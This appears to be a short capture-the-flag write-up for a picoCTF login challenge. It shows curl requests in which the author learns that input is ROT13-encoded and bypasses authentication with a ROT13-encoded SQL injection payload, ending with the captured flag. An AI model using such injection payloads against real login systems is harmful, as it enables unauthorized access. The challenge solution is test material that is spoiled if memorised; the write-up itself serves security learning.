@@ -1,0 +1,31 @@
+Irish repo is a secured login portal and it cant be logged in with default credentials.
+Lets see what exactly is happening at the backend
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1# curl https://jupiter.challenges.picoctf.org/problem/26706/login.php --data "password=test&&debug=1"
+<pre>password: test
+SQL query: SELECT * FROM admin where password = 'grfg'
+</pre><h1>Login failed.</h1>root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1#
+
+
+So the test is replaced with grfg
+
+Lets try some of the SQL injection.
+
+</pre><h1>Login failed.</h1>root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1# curl https://jupiter.challenges.picoctf.org/problem/26706/login.php --data "password=test' or 1=1-- &&debug=1"
+<pre>password: test' or 1=1--
+SQL query: SELECT * FROM admin where password = 'grfg' be 1=1-- '
+</pre>root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1#
+
+
+Okay so now here the or is replaced with be.
+So now we instead pass be instead of or.
+
+</pre>root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1# curl https://jupiter.challenges.picoctf.org/problem/26706/login.php --data "password=grfg' be 1=1-- &&debug=1"
+<pre>password: grfg' be 1=1--
+SQL query: SELECT * FROM admin where password = 'test' or 1=1-- '
+</pre><h1>Logged in!</h1>
+
+<p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>
+
+
+Nice.
